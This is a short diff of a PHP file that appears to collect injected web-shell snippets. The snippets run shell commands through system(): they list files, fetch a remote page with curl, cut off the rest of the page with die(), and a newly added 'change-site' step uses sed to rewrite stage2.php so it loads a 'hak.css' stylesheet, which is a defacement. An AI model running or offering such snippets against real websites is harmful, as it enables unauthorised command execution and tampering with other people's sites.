@@ -16,6 +16,20 @@ system("ls  | tr '\n' ',' | sed 's/,/<br>/g'");
 <?php
 system("curl http://codelis.ch/  | tr '\n' ',' | sed 's/,/<br>/g'");
 ?>
+
+
+// remove rest
+
 <?php
 die("");
+?>
+
+
+// change-site
+
+</style>
+</head>
+<body>
+<?php
+system("sed -i 's/light.css/hak.css/' stage2.php");
 ?>
